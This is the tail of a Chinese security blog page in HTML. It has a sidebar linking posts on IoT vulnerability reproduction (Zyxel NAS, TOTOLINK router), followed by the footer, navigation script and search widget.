href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南">《IoT从入门到入土》(11)--IoT靶场环境docker封装指南</a><time datetime="2022-12-08T00:19:26.000Z" title="发表于 2022-12-08 08:19:26">2022-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"><img src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</a><time datetime="2022-11-25T01:47:22.000Z" title="发表于 2022-11-25 09:47:22">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"><img src="https://picsum.photos/seed/blog-cover-08/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建">《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建</a><time datetime="2022-11-21T02:38:00.000Z" title="发表于 2022-11-21 10:38:00">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"><img src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析">《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析</a><time datetime="2022-11-10T05:43:27.000Z" title="发表于 2022-11-10 13:43:27">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）"><img src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PE文件格式整理（2020年2月23日notability手写笔记）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）">PE文件格式整理（2020年2月23日notability手写笔记）</a><time datetime="2022-11-08T01:10:26.000Z" title="发表于 2022-11-08 09:10:26">2022-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2019 - 2026 By Cyberangel</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/js/decode-copyright-url.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
